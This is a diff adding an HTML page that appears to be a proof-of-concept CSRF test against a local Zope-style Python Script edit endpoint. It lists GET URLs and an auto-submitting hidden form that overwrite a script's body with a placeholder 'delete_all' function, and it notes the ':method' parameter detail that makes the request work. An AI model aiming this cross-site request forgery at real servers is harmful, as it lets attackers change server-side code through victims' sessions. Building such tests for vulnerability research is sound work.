@@ -1,0 +1,37 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>CSRF Test Page</title>
+</head>
+<body>
+    <h1>CSRF Test Form</h1>
+    <p>
+        This form will auto-submit to simulate a CSRF request in a safe test environment.
+        <ol>
+            <li>GET: <code>http://127.0.0.1:8084/AA_test?title=attack!&body:text=def%20delete_all():%20return%20666&params=&ZPythonScriptHTML_editAction:method=Save%20Changes</code></li>
+            <li>GET: <code>http://127.0.0.1:8084/AA_test?title=attack!&body:text=def%20delete_all():%20return%20555&params=&ZPythonScriptHTML_editAction=Save%20Changes</code></li>
+        </ol>
+        <strong>IMPORTANT:</strong> The GET requests is changing the content only if the executing method-id is typed as ":method"
+    </p>
+
+    <form id="csrf_test" action="http://127.0.0.1:8084/AA_test" method="GET">
+        <!-- Example hidden fields that mimic a real form -->
+        <input type="hidden" name="title" value="attack!">
+        <input type="hidden" name="body:text" value="def delete_all(): return 777">
+        <input type="hidden" name="params" value="">
+        <input type="hidden" name="ZPythonScriptHTML_editAction:method" value="Save Changes">
+    </form>
+
+    <script>
+        // Automatically submit the form to simulate CSRF
+        do_submit = confirm('This is a CSRF test. The form will auto-submit to http://127.0.0.1:8084/AA_test');
+        if (do_submit) {
+            window.onload = function() {
+                document.getElementById('csrf_test').submit();
+            };
+        }
+    </script>
+
+</body>
+</html>
